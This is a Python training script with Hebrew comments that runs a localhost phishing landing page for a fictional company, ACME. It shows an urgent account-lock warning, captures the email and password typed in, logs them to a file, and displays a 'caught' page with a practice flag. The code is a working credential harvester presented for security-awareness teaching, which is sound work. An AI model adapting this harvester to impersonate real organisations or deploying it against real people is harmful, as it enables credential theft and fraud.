#!/usr/bin/env python3
# =====================================================================
#  הדגמת Credential Harvester  —  Phishing Landing Page  (מודול 15)
#  דף התחברות מזויף של חברה *בדיונית* (ACME) שלוכד את הפרטים שמוקלדים
#  בו — בדיוק כמו דף נחיתה של פישינג (SET / GoPhish). הרץ, "פשוט את
#  עצמך", וראה איך הסיסמה נלכדת. כך תבין למה לעולם לא מקלידים פרטים
#  אחרי לחיצה על לינק במייל.
#
#  אין צורך בהתקנות — פייתון בלבד. מאזין על 127.0.0.1 בלבד.
#  הרצה:   python3 phishing_demo.py     → http://127.0.0.1:8000
#  עצירה:  Ctrl+C
#
#  ⚠️ אתיקה: חברה בדיונית, מקומי, לתרגול בלבד. אין להתחזות לארגון אמיתי,
#     ואין להשתמש בטכניקה נגד אנשים ללא הרשאה כתובה מפורשת.
# =====================================================================
import os
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

HOST, PORT = "127.0.0.1", 8000
LOGFILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "harvested.log")

LOGIN_PAGE = """<!doctype html><html dir="rtl"><head><meta charset="utf-8">
<title>ACME Webmail — כניסה</title></head>
<body style="font-family:sans-serif;background:#f0f2f5;text-align:center;padding-top:60px">
  <div style="display:inline-block;background:#fff;padding:32px 48px;border-radius:8px;box-shadow:0 2px 8px #0002">
    <h2>🏢 ACME Corp Webmail</h2>
    <p style="color:#c00">⚠️ החשבון שלך ייחסם תוך 24 שעות — אמת את זהותך עכשיו</p>
    <form method="POST" action="/submit">
      <p><input name="email" placeholder="אימייל" style="padding:8px;width:240px"></p>
      <p><input name="password" type="password" placeholder="סיסמה" style="padding:8px;width:240px"></p>
      <p><button style="padding:8px 24px;background:#0067b8;color:#fff;border:0">התחבר</button></p>
    </form>
    <p style="font-size:11px;color:#999">(דף תרגול — שים לב לכתובת ולסימני הפישינג!)</p>
  </div>
</body></html>"""

CAUGHT_PAGE = """<!doctype html><html dir="rtl"><head><meta charset="utf-8">
<title>שגיאה</title></head><body style="font-family:sans-serif;text-align:center;padding-top:80px">
  <h2>😈 נלכדת!</h2>
  <p>הפרטים שהקלדת נשלחו כרגע ל"תוקף" (ונשמרו ל-harvested.log).</p>
  <p><b>flag{never_enter_creds_after_clicking_email_links}</b></p>
  <p style="color:#666">בפישינג אמיתי היית מופנה עכשיו לאתר האמיתי, בלי לחשוד בכלום.</p>
</body></html>"""


class Handler(BaseHTTPRequestHandler):
    server_version = "nginx"

    def _send(self, body):
        data = body.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        self._send(LOGIN_PAGE)

    def do_POST(self):
        if self.path == "/submit":
            length = int(self.headers.get("Content-Length", 0))
            p = parse_qs(self.rfile.read(length).decode("utf-8", "replace"))
            email = p.get("email", [""])[0]
            pw = p.get("password", [""])[0]
            line = f"[{datetime.now():%H:%M:%S}] CAPTURED  email={email!r}  password={pw!r}"
            print("[+] " + line)
            try:
                with open(LOGFILE, "a", encoding="utf-8") as f:
                    f.write(line + "\n")
            except OSError:
                pass
            return self._send(CAUGHT_PAGE)
        self._send(LOGIN_PAGE)

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    print(f"[*] Phishing landing page (ACME — fictional) on http://{HOST}:{PORT}")
    print(f"[*] הקלד פרטים בדף → הם ייתפסו כאן וב-{os.path.basename(LOGFILE)}")
    print("[*] Ctrl+C to stop.")
    try:
        ThreadingHTTPServer((HOST, PORT), Handler).serve_forever()
    except KeyboardInterrupt:
        print("\n[*] stopped.")
